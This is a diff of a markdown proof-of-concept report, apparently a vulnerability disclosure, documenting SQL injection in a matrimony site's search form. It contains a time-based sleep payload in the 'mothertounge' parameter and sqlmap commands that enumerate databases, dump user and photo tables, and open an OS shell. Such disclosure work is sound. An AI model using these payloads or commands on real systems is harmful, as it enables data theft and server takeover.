@@ -80,17 +80,19 @@ Step 2 – Vulnerable Source Code
 
 The login function directly embeds POST parameters into the SQL query. 
 
-![POC](images/sqli para.png)
+![POC](images/sqli%20para.png)
 
 The ‘ in parameter leads to MySQL error confirming SQL injection 
 
-![POC](images/sqli para.png)
+![POC](images/sqli%20error_1.png)
+
+![POC](images/sqli%20error_2.png)
 
 Step 3 – Manual SQL Injection 
 
 The intercepted POST request was modified by injecting a time-based SQL payload into the  mothertounge parameter. 
 
-![POC](images/sqli para.png)
+![POC](images/sqli%20manual.png)
 
 Payload: sex=male&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil'%2b(select*from(select(sleep(20)))a)%2b'&agemin=19&agemax=50&search=Search
 
@@ -102,7 +104,7 @@ The captured request was supplied to SQLMap.
 
 command: ```python python .\sqlmap.py -r .\code_test_1.txt -p mothertounge --dbs```
 
-![POC](images/sqli para.png)
+![POC](images/sqli%201.png)
 
 SQLMap confirmed that the mothertounge parameter is injectable using: 
 • Boolean-based Blind SQL Injection  
@@ -113,7 +115,7 @@ Database Enumeration
 
 Using SQLMap, multiple databases were successfully enumerated. 
 
-![POC](images/sqli para.png)
+![POC](images/sqli%202.png)
 
 information_schema 
 mysql 
@@ -129,9 +131,10 @@ command: ```python python .\sqlmap.py -r .\code_test_1.txt -p mothertounge -D ma
  python .\sqlmap.py -r .\code_test_1.txt -p mothertounge -D matrimony -T partnerprefs --dump
 python .\sqlmap.py -r .\code_test_1.txt -p mothertounge -D matrimony -T photos --dump```
 
-![POC](images/sqli para.png)
-![POC](images/sqli para.png)
-![POC](images/sqli para.png)
+![POC](images/sqli%203.png)
+![POC](images/sqli%205.png)
+![POC](images/sqli%206.png)
+
 
 Operating System Command Execution 
 
@@ -139,12 +142,14 @@ Because the backend database account possessed excessive privileges, SQLMap succ
 command: 
 ```python python .\sqlmap.py -r .\code_test_1.txt -p mothertounge --os-shell``` 
 
-![POC](images/sqli para.png)
+![POC](images/sqli%204.png)
 
 The following command was successfully executed: 
 whoami 
+
 Result: 
 command standard output: '[redacted]' 
+
 This demonstrates that SQL Injection can lead to operating system command execution when  the underlying environment is insecurely configured.
 
 **Impact**
